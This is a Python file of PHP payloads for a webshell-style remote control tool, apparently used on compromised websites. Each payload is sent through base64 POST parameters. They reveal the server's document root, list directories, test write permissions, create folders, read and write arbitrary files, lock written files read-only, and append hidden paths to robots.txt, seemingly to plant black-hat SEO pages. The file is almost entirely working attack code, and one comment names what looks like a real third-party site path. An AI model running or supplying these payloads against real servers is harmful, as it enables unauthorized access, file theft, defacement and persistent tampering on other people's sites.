#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842


#获取网站路径
php_www_path="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
echo $_SERVER['DOCUMENT_ROOT']."/";   //获取程序根目录
echo("|<-");
die();
?>
"""

#遍历路径 文件夹
PHP_bl_path="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
//$D=base64_decode($_POST["z1"]);
//$D="D:/wamp/www";
$D=$_SERVER['DOCUMENT_ROOT'];   //获取程序根目录
$F=@opendir($D);  //打开 images 目录
if($F==NULL)
{
echo("ERROR: Path Not Found Or No Permission!");
}
else
{
while($N=@readdir($F))
{$P=$D."/".$N;
if(@is_dir($P))//目录
{
if (!(($N==".")or($N=="..")))  //只要文件夹
{
	echo($D."/".$N);
	echo("\t");
}
}
}
};
echo("|<-");
die();
?>
"""
#获取目录权限
PHP_qx_path="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$filename=base64_decode($_POST["z1"]);
//$filename="D:/wamp/www/data/index.html";
////$filename=str_replace('\\','/',$filename);
//$file_hd2=@fopen($filename,'w');  //打开文件不存在则创建
////if(!$file_hd2){
////	@fclose($file_hd2);
////	echo("1");
////}else{
////	echo("0");
////}
//if(is_file($filename)){   //检查指定的文件名是否是正常的文件
//    //文件不可写，直接返回
//	if(is_writable($filename)){   //判断文件是否存在
//		echo("1");
//		}
//}
//@unlink($filename);  //删除文件
echo @fopen($filename,"w")?"1":"0";
@unlink($filename);  //删除文件
echo("|<-");
die();
?>
"""
#判断文件夹是否存在不存在则创建
php_mkdir_path="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$filename=base64_decode($_POST["z1"]);
//$filename="D:/wamp/www/data/111";
if(is_dir($filename))
  {  //目录存在
  echo("1");
  }
else
  {  //目录不存在
  if(@mkdir($filename,0777,true)){
  	echo("1");
  }
  else{
  	echo("0");
  }
  }
//@fopen($filename,"w")?"1":"0";
echo("|<-");
die();
?>
"""
#读取文件
php_open_file="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
//$F=get_magic_quotes_gpc()?stripslashes("/home/azch4xbvjz/domains/cincon.cn/public_html/home/azch4xbvjz/domains/cincon.cn/public_html/special/index.php"):"/home/azch4xbvjz/domains/cincon.cn/public_html/home/azch4xbvjz/domains/cincon.cn/public_html/special/index.php";
//echo $f;
if (!$fp=@file_get_contents($F))
{
	echo("no");
}else{
	echo $fp;
}
echo("|<-");
die();
?>
"""
#写入文件
php_add_file="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;
$filename=base64_decode($_POST["z3"]);
//$filename="D:/wamp/www/data/111";
if(!is_dir($filename))
  {  //目录不存在
  @mkdir($filename,0777,true);
  }
echo @fwrite(fopen(base64_decode($_POST["z1"]),"w"),base64_decode($_POST["z2"]))?"1":"0";;
@chmod(base64_decode($_POST["z1"]),0444);
echo("|<-");
die();
?>
"""

"""
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
$f=base64_decode($_POST["z1"]);  //路径
//$f="D:/wamp/www/1.txt";
$c=$_POST["z2"];  //内容
//$c="3C3F7068700D0A24463D22433A2F77616D702F7777772F2F696E6465782E706870223B0D0A6563686F2866696C655F657869737473282446293F63686D6F642824462C30363636293F2231223A2230223A223022293B0D0A64696528293B0D0A3F3E";  //内容
//$c=str_replace("%","",$c);  //替换
//$c=str_replace(",","",$c);  //替换
$c=str_replace("\r","",$c);  //替换
$c=str_replace("\n","",$c);  //替换
//echo $c;
$buf="";  //替换
for($i=0;$i<strlen($c);$i+=2)
$buf.=urldecode("%".substr($c,$i,2));//还原 URL 编码字符串
@chmod($F,0777);   //读写权限
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");
echo("|<-");
die();
"""

#写入图片文件
php_add_file_tp="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;
$f=base64_decode($_POST["z1"]);
$c=$_POST["z2"];
$c=str_replace("\r","",$c);
$c=str_replace("\n","",$c);
$buf="";
for($i=0;$i<strlen($c);$i+=2)
$buf.=urldecode("%".substr($c,$i,2));
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");;
echo("|<-");
die();
//&z1=RDpcXFdlYlNpdGVcXHNoZW56aGVuXFxhXFwxLmpwZw==
//D:\\WebSite\\shenzhen\\a\\1.jpg
//&z2=
?>
"""

#添加蜘蛛引导页
robots_add="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;
$path=base64_decode($_POST["z1"]);
$folderpath=$_SERVER['DOCUMENT_ROOT']."/robots.txt";   //获取程序根目录
if(!file_exists($folderpath)){
$fp = fopen($folderpath, 'a+');
$str="User-agent: * ";
fputs($fp, $str);
fputs($fp,PHP_EOL);
fputs($fp,"Sitemap: /sitemap.xml");
fputs($fp,PHP_EOL);
fclose($fp);
}
$fp = fopen($folderpath, 'a+');
fputs($fp,PHP_EOL);
fputs($fp,"Disallow: /".$path);
//puts($fp,"Disallow: /".$path.PHP_EOL);
fputs($fp,PHP_EOL);
fputs($fp,"Sitemap: /sitemap.xml");
fclose($fp);
echo("|<-");
die();
?>
"""

